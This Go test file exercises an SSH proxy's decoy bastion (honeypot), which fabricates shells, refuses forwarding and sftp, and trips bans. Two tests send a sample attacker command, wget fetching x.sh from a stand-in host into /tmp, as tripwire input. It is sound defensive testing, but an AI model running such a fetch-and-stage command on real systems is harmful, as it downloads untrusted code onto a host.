package ssh_test

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	cssh "golang.org/x/crypto/ssh"

	"github.com/rom/xproxy/internal/config"
	"github.com/rom/xproxy/internal/passwd"
	"github.com/rom/xproxy/internal/proxy"
	"github.com/rom/xproxy/internal/proxytest"
)

// A bastion that is not there, through the whole listener.
//
// What is worth asserting is the wiring and the three refusals: nothing is
// forwarded, nothing is run, and no session that was going to reach a machine is
// answered here.

// hashOf is the stored form of a password, as xproxyctl htpasswd writes it,
// at the low iteration count tests use.
func hashOf(t *testing.T, password string) string {
	t.Helper()
	h, err := passwd.HashWithIterations(password, 1000)
	if err != nil {
		t.Fatal(err)
	}
	return h
}

// decoyBastion starts a listener that is nothing but a fabrication: no upstream,
// no authorized_keys, no key to authenticate onwards with, and a host key, which
// is the one thing it still needs because clients pin it.
func decoyBastion(t *testing.T, section string) (*proxy.Server, string) {
	t.Helper()
	return decoyBastionWith(t, section, "")
}

// decoyBastionWith is decoyBastion with sections outside the listener too, for
// the ban ladder the tripwire feeds.
func decoyBastionWith(t *testing.T, section, top string) (*proxy.Server, string) {
	t.Helper()
	dir := t.TempDir()
	hostKeyPath, _, _ := sshKey(t, dir, "host")
	yaml := fmt.Sprintf(`
version: 1
server:
  listeners:
    - name: bastion
      address: "127.0.0.1:0"
      kind: ssh
      ssh:
        host_keys: [%s]
        deception:
          mode: decoy
%s
logging: {access: {enabled: false}}
%s
`, hostKeyPath, section, top)
	s := proxytest.Start(t, yaml)
	return s, s.Addrs()["bastion"]
}

// dialDecoy logs in with a password, which is what the fabrication takes.
func dialDecoy(t *testing.T, addr, user, pass string) *cssh.Client {
	t.Helper()
	c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User:            user,
		Auth:            []cssh.AuthMethod{cssh.Password(pass)},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("dial the fabrication: %v", err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c
}

// A honeypot bastion: it takes the credential and there is nothing behind it.
func TestADecoyBastionAnswersWithNoMachineBehindIt(t *testing.T) {
	s, addr := decoyBastion(t, `          profile: linux
          hostname: app-77
          tripwire: [payroll]`)
	c := dialDecoy(t, addr, "root", "hunter2")

	// An exec, which is the shape an automated payload takes.
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	out, err := sess.Output("uname -a")
	_ = sess.Close()
	if err != nil {
		t.Fatalf("uname -a: %v", err)
	}
	if !strings.Contains(string(out), "app-77") {
		t.Errorf("uname -a answered %q, and the hostname is the operator's", out)
	}
	// The command that matters. It fails to connect, because nothing here
	// fetches anything -- and the address it named is in the record.
	sess2, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	got, _ := sess2.CombinedOutput("wget http://198.51.100.9/x.sh -O /tmp/x")
	_ = sess2.Close()
	if !strings.Contains(string(got), "connect") {
		t.Errorf("wget answered %q", got)
	}
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHTripwire >= 1 },
		"the escalation did not trip the wire")
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 3 },
		"the deception counter did not move")

	// The status view knows about it.
	st, ok := sshDecoyStatus(s)
	if !ok {
		t.Fatal("the listener reported no decoy")
	}
	if st.Mode != "decoy" || st.Kind != "ssh" || st.Profile != "linux" {
		t.Errorf("status %+v", st)
	}
	if st.Served == 0 || st.Tripped == 0 || !st.Anyone || len(st.Visitors) != 1 {
		t.Errorf("status %+v", st)
	}
}

// Nothing is forwarded. A direct-tcpip channel on a fabricated bastion is a
// client asking to use this proxy as an open relay, and granting one would put
// this estate's address on somebody else's work.
func TestADecoyBastionForwardsNothing(t *testing.T) {
	s, addr := decoyBastion(t, "          hostname: app-77")
	c := dialDecoy(t, addr, "root", "hunter2")
	if conn, err := c.Dial("tcp", "198.51.100.9:25"); err == nil {
		_ = conn.Close()
		t.Fatal("the fabrication forwarded a connection")
	}
	// And it is the one refusal that is itself the finding.
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHTripwire >= 1 },
		"a forwarding request did not trip the wire")
	// A remote forward is the same request from the other side, and is refused
	// the same way.
	if _, err := c.Listen("tcp", "127.0.0.1:0"); err == nil {
		t.Error("the fabrication accepted a remote forward")
	}
	// sftp is how a payload is uploaded rather than fetched; there is no
	// fabricated file system to put one in.
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = sess.Close() }()
	if err := sess.RequestSubsystem("sftp"); err == nil {
		t.Error("the fabrication accepted an sftp subsystem")
	}
}

// An interactive shell, which is what a person gets, and the sequence a script
// sends when it finds one.
func TestADecoyBastionAnswersAnInteractiveShell(t *testing.T) {
	// No profile: an SSH port fronts a server, so the small-server profile is
	// the default, and the MOTD this reads is what says so.
	_, addr := decoyBastion(t, "          hostname: app-77")
	c := dialDecoy(t, addr, "admin", "admin")
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = sess.Close() }()
	in, err := sess.StdinPipe()
	if err != nil {
		t.Fatal(err)
	}
	out, err := sess.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := sess.RequestPty("xterm", 24, 80, cssh.TerminalModes{}); err != nil {
		t.Fatal(err)
	}
	if err := sess.Shell(); err != nil {
		t.Fatal(err)
	}
	read := func(want string) string {
		t.Helper()
		var got []byte
		buf := make([]byte, 512)
		deadline := time.Now().Add(5 * time.Second)
		for time.Now().Before(deadline) {
			n, err := out.Read(buf)
			got = append(got, buf[:n]...)
			if strings.Contains(string(got), want) {
				return string(got)
			}
			if err != nil {
				break
			}
		}
		t.Fatalf("never read %q, got %q", want, got)
		return ""
	}
	// The MOTD and the prompt, which is what a person reads first.
	first := read("admin@app-77")
	if !strings.Contains(first, "Ubuntu") {
		t.Errorf("the login answered %q", first)
	}
	if _, err := in.Write([]byte("id\r")); err != nil {
		t.Fatal(err)
	}
	if got := read("uid="); !strings.Contains(got, "uid=1000(admin)") {
		t.Errorf("id answered %q", got)
	}
	if _, err := in.Write([]byte("exit\r")); err != nil {
		t.Fatal(err)
	}
	_ = sess.Wait()
}

// The credential exchange: every one is taken, none of them decides, and what is
// kept is not the password.
func TestTheFabricatedLoginTakesEveryCredentialAndKeepsNone(t *testing.T) {
	s, addr := decoyBastion(t, `          hostname: app-77
          attempts: 2`)
	// Two passwords are taken before the login is accepted, and the second is
	// accepted whatever it was: the client offers two and gets in.
	tried := 0
	c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User: "root",
		Auth: []cssh.AuthMethod{cssh.RetryableAuthMethod(cssh.PasswordCallback(func() (string, error) {
			tried++
			return fmt.Sprintf("guess-%d", tried), nil
		}), 3)},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if tried != 2 {
		t.Errorf("the fabrication took %d credentials, want 2", tried)
	}
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 2 },
		"the login attempts were not recorded")
}

// A public key is refused rather than accepted, so the client falls back to the
// password -- which is what a trap on port 22 is for. The fingerprint is still
// recorded, because a key being tried against an estate is worth knowing about.
func TestADecoyBastionRefusesAKeyAndTakesThePassword(t *testing.T) {
	dir := t.TempDir()
	_, signer, _ := sshKey(t, dir, "visitor")
	s, addr := decoyBastion(t, "          hostname: app-77")
	c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User: "root",
		Auth: []cssh.AuthMethod{
			cssh.PublicKeys(signer),
			cssh.Password("hunter2"),
		},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 2 },
		"the key and the password were not both recorded")
}

// The same fabrication on a bastion that fronts real machines: it answers a
// credential the listener refused, and nothing else.
//
// That is the invariant the whole feature rests on -- a session on its way to a
// machine is never answered here -- and this is the test of it.
func TestOnARealBastionOnlyRefusedCredentialsAreFabricated(t *testing.T) {
	dir := t.TempDir()
	usersFile := filepath.Join(dir, "users")
	// A password file with one account, so the listener offers password
	// authentication at all: the fabrication adds no method the listener did
	// not already have.
	if err := os.WriteFile(usersFile, []byte("alice:"+hashOf(t, "a long enough password")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	s, addr, key, tg := bastion(t, fmt.Sprintf(`        users_file: %s
        deception:
          mode: answer
          clients: ["127.0.0.0/8"]
          hostname: app-77
`, usersFile))

	// The real key still reaches the real machine.
	c := dialBastion(t, addr, key)
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	if _, err := sess.Output("uptime"); err != nil {
		t.Fatalf("an admitted session was refused: %v", err)
	}
	_ = sess.Close()
	if got := tg.seen(); len(got) == 0 {
		t.Fatal("the admitted session never reached the target")
	}
	before := len(tg.seen())

	// A wrong password is refused by the listener and answered by the
	// fabrication: the visitor gets a shell, and the machine sees nothing.
	bad := dialDecoy(t, addr, "alice", "wrong")
	s2, err := bad.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	out, err := s2.Output("uname -a")
	_ = s2.Close()
	if err != nil {
		t.Fatalf("the fabricated session refused a command: %v", err)
	}
	if !strings.Contains(string(out), "app-77") {
		t.Errorf("the fabrication answered %q", out)
	}
	if got := tg.seen(); len(got) != before {
		t.Fatalf("the fabricated session reached the target: %q", got[before:])
	}
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 2 },
		"the fabrication did not answer the refused credential")
	// And the refusal counters still moved: the fabrication replaces what the
	// client is told, not what the operator is told.
	if n := s.Stats().Refusals["ssh"]["auth_failed"]; n < 1 {
		t.Errorf("the refusal was not counted: %+v", s.Stats().Refusals["ssh"])
	}
	if n := s.Stats().SSHAuthFailed; n < 1 {
		t.Errorf("ssh_auth_failed is %d: the fabrication hid the refusal from the operator", n)
	}
}

// A client outside the section's list is refused rather than lied to.
func TestASSHClientOutsideTheListIsStillRefused(t *testing.T) {
	dir := t.TempDir()
	usersFile := filepath.Join(dir, "users")
	if err := os.WriteFile(usersFile, []byte("alice:"+hashOf(t, "a long enough password")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	s, addr, _, _ := bastion(t, fmt.Sprintf(`        users_file: %s
        deception:
          mode: answer
          clients: ["10.9.0.0/24"]
`, usersFile))
	if _, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User:            "alice",
		Auth:            []cssh.AuthMethod{cssh.Password("wrong")},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	}); err == nil {
		t.Fatal("a client outside the list was let in")
	}
	if n := s.Stats().SSHDeceived; n != 0 {
		t.Errorf("the fabrication answered %d exchanges for a client outside its list", n)
	}

	// The list means the same thing on a listener that is nothing but a
	// fabrication: a client it does not name gets the refusal a bastion with no
	// account for them gets, and nothing is taken from it.
	s2, addr2 := decoyBastion(t, "          clients: [\"10.9.0.0/24\"]")
	_, visitor, _ := sshKey(t, t.TempDir(), "visitor")
	// All three methods, because the list has to mean the same thing at each of
	// them: a key offered here must not even be written down.
	if c, err := cssh.Dial("tcp", addr2, &cssh.ClientConfig{
		User: "root",
		Auth: []cssh.AuthMethod{
			cssh.PublicKeys(visitor),
			cssh.Password("hunter2"),
			cssh.KeyboardInteractive(func(string, string, []string, []bool) ([]string, error) {
				return []string{"hunter2"}, nil
			}),
		},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	}); err == nil {
		_ = c.Close()
		t.Fatal("a decoy admitted a client outside its list")
	}
	if n := s2.Stats().SSHDeceived; n != 0 {
		t.Errorf("the decoy took %d credentials from a client outside its list", n)
	}
	if st, ok := sshDecoyStatus(s2); ok && st.Served != 0 {
		t.Errorf("the decoy recorded %d visitors it never answered", st.Served)
	}
}

// What a decoy bastion refuses to load: the settings it would silently ignore,
// and the ones that make no sense without a machine.
func TestWhatADecoyBastionRefusesToLoad(t *testing.T) {
	dir := t.TempDir()
	hostKeyPath, _, _ := sshKey(t, dir, "host")
	for _, tc := range []struct{ name, section, wants string }{
		{
			name:    "a decoy with an upstream is a contradiction",
			section: "        upstream: hosts\n        deception: {mode: decoy}",
			wants:   "decoy is the whole listener",
		},
		{
			name:    "a decoy that checks a grant",
			section: "        deception: {mode: decoy}\n        require_grant: true",
			wants:   "nobody real to check a grant for",
		},
		{
			name:    "a decoy with a second factor",
			section: "        deception: {mode: decoy}\n        mfa: {file: /dev/null}",
			wants:   "would refuse the visitors",
		},
		{
			name:    "answer mode with no client list",
			section: "        upstream: hosts\n        deception: {mode: answer}",
			wants:   "clients: required in mode answer",
		},
		{
			name:    "a profile nobody has",
			section: "        deception: {mode: decoy, profile: openwrt}",
			wants:   "is not a profile",
		},
		{
			// The protocol stops the client first, so a trap waiting for a
			// fifth credential on a listener that allows three never accepts.
			name:    "more attempts than the protocol allows",
			section: "        max_auth_tries: 3\n        deception: {mode: decoy, attempts: 5}",
			wants:   "max_auth_tries is 3",
		},
		{
			name:    "a listener with neither an upstream nor a decoy",
			section: "        deception: {mode: decoy, enabled: false}",
			wants:   "upstream: required",
		},
		{
			name:    "and a whole section that is right",
			section: "        deception: {mode: decoy, profile: linux, hostname: app-77, attempts: 3}",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			yaml := fmt.Sprintf(`
version: 1
server:
  listeners:
    - name: bastion
      address: "127.0.0.1:0"
      kind: ssh
      ssh:
        host_keys: [%s]
%s
logging: {access: {enabled: false}}
upstreams:
  - name: hosts
    endpoints: [{address: "127.0.0.1:2222"}]
`, hostKeyPath, tc.section)
			_, err := config.Parse([]byte(yaml))
			switch {
			case tc.wants == "" && err != nil:
				t.Fatalf("did not load: %v", err)
			case tc.wants == "":
			case err == nil:
				t.Fatalf("loaded, want %q", tc.wants)
			case !strings.Contains(err.Error(), tc.wants):
				t.Fatalf("error %v, want %q", err, tc.wants)
			}
		})
	}
}

// sshDecoyStatus finds this listener's fabrication in the status view.
func sshDecoyStatus(s *proxy.Server) (proxy.DecoyStatus, bool) {
	for _, st := range s.DeviceDecoys() {
		if st.Kind == "ssh" {
			return st, true
		}
	}
	return proxy.DecoyStatus{}, false
}

// awaitSSH polls for a condition, because the bastion runs the connection on its
// own goroutines.
func awaitSSH(t *testing.T, s *proxy.Server, ok func(proxy.Snapshot) bool, what string) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if ok(s.Stats()) {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	sn := s.Stats()
	t.Fatalf("%s: deceived %d, tripped %d", what, sn.SSHDeceived, sn.SSHTripwire)
}

// A remote forward on its own, which is the same open-relay request as
// direct-tcpip from the other direction: refused, and the refusal is the finding.
//
// Its own test because the other forwarding refusal would otherwise account for
// the tripwire, and then nothing would say this one raises it.
func TestADecoyBastionRefusesARemoteForward(t *testing.T) {
	s, addr := decoyBastion(t, "          hostname: app-77")
	c := dialDecoy(t, addr, "root", "hunter2")
	// A fixed port rather than 0: a port the client chose needs no bound-port
	// reply, so what is asserted is the refusal and not a reply it could not
	// parse.
	if l, err := c.Listen("tcp", "127.0.0.1:2222"); err == nil {
		_ = l.Close()
		t.Fatal("the fabrication agreed to listen on a client's behalf")
	}
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHTripwire >= 1 },
		"a remote forward did not trip the wire")
}

// The tripwire feeds the ban ladder, which is the difference between it and an
// ordinary fabricated exchange: a wget typed into a machine that is not there is
// a finding every other listener would act on.
func TestATrippedFabricationReachesTheBanLadder(t *testing.T) {
	s, addr := decoyBastionWith(t, "          hostname: app-77", `
bans:
  action: reject
  triggers: [{name: traps, reasons: [ssh_tripwire], threshold: 1, window: 1m, duration: 1h}]`)
	c := dialDecoy(t, addr, "root", "hunter2")
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	_, _ = sess.CombinedOutput("wget http://198.51.100.9/x.sh")
	_ = sess.Close()
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.BansActive >= 1 },
		"the escalation did not reach the ban ladder")
}

// A key is never one of the credentials the fabricated login accepts on. A
// visitor let in on a key would have proved only that it holds one, and the
// password is what a trap on port 22 is for.
func TestADecoyBastionNeverAcceptsAKey(t *testing.T) {
	dir := t.TempDir()
	_, signer, _ := sshKey(t, dir, "visitor")
	s, addr := decoyBastion(t, "          hostname: app-77\n          attempts: 2")
	// One key and one password, against a login that takes two credentials: the
	// key is refused and recorded, the password is the first of the two, and
	// there is nothing left to offer.
	if c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User: "root",
		Auth: []cssh.AuthMethod{
			cssh.PublicKeys(signer),
			cssh.Password("hunter2"),
		},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	}); err == nil {
		_ = c.Close()
		t.Fatal("a key and one password were enough for a login that takes two credentials")
	}
	// Both were taken: the fingerprint and the credential.
	awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 2 },
		"the key and the password were not both recorded")

	// And the second credential is accepted, so the trap still collects.
	tries := 0
	c2, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User: "root",
		Auth: []cssh.AuthMethod{cssh.RetryableAuthMethod(cssh.PasswordCallback(func() (string, error) {
			tries++
			return fmt.Sprintf("hunter%d", tries), nil
		}), 3)},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("two credentials were not enough: %v", err)
	}
	defer func() { _ = c2.Close() }()
	if tries != 2 {
		t.Errorf("the login accepted on credential %d, want the second", tries)
	}
}

// The same on a real bastion: a section that asks for several credentials gets
// them, and the first refusal is still a refusal.
func TestOnARealBastionTheFabricationCanTakeSeveralCredentials(t *testing.T) {
	dir := t.TempDir()
	usersFile := filepath.Join(dir, "users")
	if err := os.WriteFile(usersFile, []byte("alice:"+hashOf(t, "a long enough password")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, addr, _, tg := bastion(t, fmt.Sprintf(`        users_file: %s
        deception:
          mode: answer
          clients: ["127.0.0.0/8"]
          attempts: 3
`, usersFile))
	if c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User:            "alice",
		Auth:            []cssh.AuthMethod{cssh.Password("wrong")},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	}); err == nil {
		_ = c.Close()
		t.Fatal("one credential was enough for a section that asks for three")
	}
	tries := 0
	c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
		User: "alice",
		Auth: []cssh.AuthMethod{cssh.RetryableAuthMethod(cssh.PasswordCallback(func() (string, error) {
			tries++
			return fmt.Sprintf("wrong%d", tries), nil
		}), 4)},
		HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("three credentials were not enough: %v", err)
	}
	defer func() { _ = c.Close() }()
	if tries != 3 {
		t.Errorf("the fabrication accepted on credential %d, want the third", tries)
	}
	if got := tg.seen(); len(got) != 0 {
		t.Fatalf("the fabricated session reached the target: %q", got)
	}
}

// A second factor and the fabrication together.
//
// RFC 4252 partial success is the protocol saying the credential was right and
// another factor comes next. A fabrication that read it as a refusal would hand
// out a shell instead of asking for the second factor -- which is the second
// factor removed, by the feature that exists to watch people fail it.
func TestTheFabricationNeverAnswersAFactorThatWasRight(t *testing.T) {
	deception := "        deception:\n          mode: answer\n          clients: [\"127.0.0.0/8\"]\n"
	t.Run("the key is the first factor", func(t *testing.T) {
		dir := t.TempDir()
		mfaFile, secret := enrolMFA(t, dir, "alice")
		s, addr, key, tg := bastion(t, "        mfa: {file: "+mfaFile+", skew: 1}\n"+deception)
		c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
			User: "alice",
			Auth: []cssh.AuthMethod{
				cssh.PublicKeys(key),
				cssh.KeyboardInteractive(func(string, string, []string, []bool) ([]string, error) {
					code, err := mfaCode(secret)
					return []string{code}, err
				}),
			},
			HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
			Timeout:         5 * time.Second,
		})
		if err != nil {
			t.Fatalf("dial with both factors: %v", err)
		}
		defer func() { _ = c.Close() }()
		sess, err := c.NewSession()
		if err != nil {
			t.Fatal(err)
		}
		if out, err := sess.Output("uptime"); err != nil || string(out) != "ran uptime" {
			t.Fatalf("both factors were answered and the session ran %q (%v)", out, err)
		}
		_ = sess.Close()
		if got := tg.seen(); len(got) == 0 {
			t.Fatal("an authorised session never reached the target")
		}
		if n := s.Stats().SSHDeceived; n != 0 {
			t.Errorf("the fabrication answered %d exchanges of an authorised session", n)
		}
	})

	t.Run("the password is the first factor", func(t *testing.T) {
		dir := t.TempDir()
		mfaFile, secret := enrolMFA(t, dir, "alice")
		usersFile := filepath.Join(dir, "users")
		if err := os.WriteFile(usersFile, []byte("alice:"+hashOf(t, "a long enough password")+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		s, addr, _, tg := bastion(t, "        mfa: {file: "+mfaFile+", skew: 1}\n"+
			"        users_file: "+usersFile+"\n"+deception)
		c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
			User: "alice",
			Auth: []cssh.AuthMethod{
				cssh.Password("a long enough password"),
				cssh.KeyboardInteractive(func(string, string, []string, []bool) ([]string, error) {
					code, err := mfaCode(secret)
					return []string{code}, err
				}),
			},
			HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
			Timeout:         5 * time.Second,
		})
		if err != nil {
			t.Fatalf("dial with both factors: %v", err)
		}
		defer func() { _ = c.Close() }()
		sess, err := c.NewSession()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := sess.Output("uptime"); err != nil {
			t.Fatalf("both factors were answered and the session was refused: %v", err)
		}
		_ = sess.Close()
		if got := tg.seen(); len(got) == 0 {
			t.Fatal("an authorised session never reached the target")
		}
		if n := s.Stats().SSHDeceived; n != 0 {
			t.Errorf("the fabrication answered %d exchanges of an authorised session", n)
		}
	})

	// And the refusal it does replace: the right first factor with the wrong
	// code, which is what the section is for.
	t.Run("a failed second factor is fabricated", func(t *testing.T) {
		dir := t.TempDir()
		mfaFile, _ := enrolMFA(t, dir, "alice")
		s, addr, key, tg := bastion(t, "        mfa: {file: "+mfaFile+"}\n"+deception)
		c, err := cssh.Dial("tcp", addr, &cssh.ClientConfig{
			User: "alice",
			Auth: []cssh.AuthMethod{
				cssh.PublicKeys(key),
				cssh.KeyboardInteractive(func(string, string, []string, []bool) ([]string, error) {
					return []string{"000000"}, nil
				}),
			},
			HostKeyCallback: cssh.InsecureIgnoreHostKey(), //nolint:gosec // the test pins nothing
			Timeout:         5 * time.Second,
		})
		if err != nil {
			t.Fatalf("the failed factor was refused rather than fabricated: %v", err)
		}
		defer func() { _ = c.Close() }()
		sess, err := c.NewSession()
		if err != nil {
			t.Fatal(err)
		}
		out, err := sess.Output("uname -a")
		_ = sess.Close()
		if err != nil {
			t.Fatalf("the fabrication refused a command: %v", err)
		}
		if strings.Contains(string(out), "ran uname") {
			t.Errorf("the session reached the target: %q", out)
		}
		if got := tg.seen(); len(got) != 0 {
			t.Fatalf("the fabricated session reached the target: %q", got)
		}
		awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 1 },
			"the failed second factor was not fabricated")
	})
}

// A session is bounded in commands as well as in time: a script in a loop must
// not hold a worker on a listener whose whole purpose is to be found.
func TestADecoyBastionBoundsOneSessionsCommands(t *testing.T) {
	s, addr := decoyBastion(t, "          hostname: app-77")
	c := dialDecoy(t, addr, "root", "hunter2")
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = sess.Close() }()
	in, err := sess.StdinPipe()
	if err != nil {
		t.Fatal(err)
	}
	out, err := sess.StdoutPipe()
	if err != nil {
		t.Fatal(err)
	}
	if err := sess.Shell(); err != nil {
		t.Fatal(err)
	}
	// More commands than the bound, which is maxDecoyCommands (500). The writer
	// runs alongside the reader because the shell stops reading once the bound is
	// reached, and a writer that had to finish first would block on the channel's
	// window.
	go func() {
		for i := 0; i < 600; i++ {
			if _, err := in.Write([]byte("id\r")); err != nil {
				return
			}
		}
	}()
	// The fabrication closes the channel rather than answering for ever, so the
	// read ends. A shell that ran without a bound would keep answering and this
	// would time out.
	done := make(chan error, 1)
	go func() {
		_, err := io.Copy(io.Discard, out)
		done <- err
	}()
	select {
	case <-done:
	case <-time.After(30 * time.Second):
		t.Fatalf("the fabricated shell answered past its bound: deceived=%d", s.Stats().SSHDeceived)
	}
}

// The refusals that happen after the credential was accepted: the estate's own
// authorisation policy, and a missing access grant. Both are questions about
// reaching a target, and a session neither of them admits was never going to
// reach one -- so the fabrication replaces them too.
func TestTheEstatesOwnRefusalsAreFabricated(t *testing.T) {
	deception := "        deception:\n          mode: answer\n          clients: [\"127.0.0.0/8\"]\n" +
		"          hostname: app-77\n"
	t.Run("a policy that does not cover the client", func(t *testing.T) {
		s, addr, key, tg := bastionWith(t, deception, `authorization:
  rules:
    - {name: robots-only, allow: true, users: [robot]}
`)
		sess, err := sshSession(t, addr, key)
		if err != nil {
			t.Fatalf("the policy's refusal was not fabricated: %v", err)
		}
		out, err := sess.Output("uname -a")
		_ = sess.Close()
		if err != nil {
			t.Fatalf("the fabrication refused a command: %v", err)
		}
		if !strings.Contains(string(out), "app-77") {
			t.Errorf("the fabrication answered %q", out)
		}
		if got := tg.seen(); len(got) != 0 {
			t.Fatalf("a session the policy refused reached the target: %q", got)
		}
		// The refusal was still counted where every other refusal is: what the
		// fabrication replaces is what the client is told.
		if n := s.Stats().SSHRejected; n < 1 {
			t.Errorf("the refusal was not counted: %d", n)
		}
		awaitSSH(t, s, func(sn proxy.Snapshot) bool { return sn.SSHDeceived >= 1 },
			"the policy's refusal did not reach the fabrication")
	})

	// A listener that is nothing but a fabrication is not asked either
	// question. The policy and the grant are about reaching a target, and this
	// listener has none -- so a policy that refuses everybody must not produce
	// a refusal against a session that was never going anywhere.
	t.Run("a decoy listener is not asked", func(t *testing.T) {
		s, addr := decoyBastionWith(t, "          hostname: app-77", `authorization:
  rules:
    - {name: robots-only, allow: true, users: [robot]}
`)
		c := dialDecoy(t, addr, "root", "hunter2")
		sess, err := c.NewSession()
		if err != nil {
			t.Fatal(err)
		}
		out, err := sess.Output("uname -a")
		_ = sess.Close()
		if err != nil {
			t.Fatalf("the fabrication refused a command: %v", err)
		}
		if !strings.Contains(string(out), "app-77") {
			t.Errorf("the fabrication answered %q", out)
		}
		if n := s.Stats().SSHRejected; n != 0 {
			t.Errorf("a session with no target to be authorised for was refused %d times", n)
		}
	})

	// And a client the section does not cover is refused by the policy as it
	// would be without a deception section at all.
	t.Run("a client the section does not cover", func(t *testing.T) {
		s, addr, key, tg := bastionWith(t, "        deception:\n          mode: answer\n"+
			"          clients: [\"10.9.0.0/24\"]\n", `authorization:
  rules:
    - {name: robots-only, allow: true, users: [robot]}
`)
		if _, err := sshSession(t, addr, key); err == nil {
			t.Error("a client outside the list was let in")
		}
		if got := tg.seen(); len(got) != 0 {
			t.Fatalf("the session reached the target: %q", got)
		}
		if n := s.Stats().SSHDeceived; n != 0 {
			t.Errorf("the fabrication answered %d exchanges for a client outside its list", n)
		}
	})
}
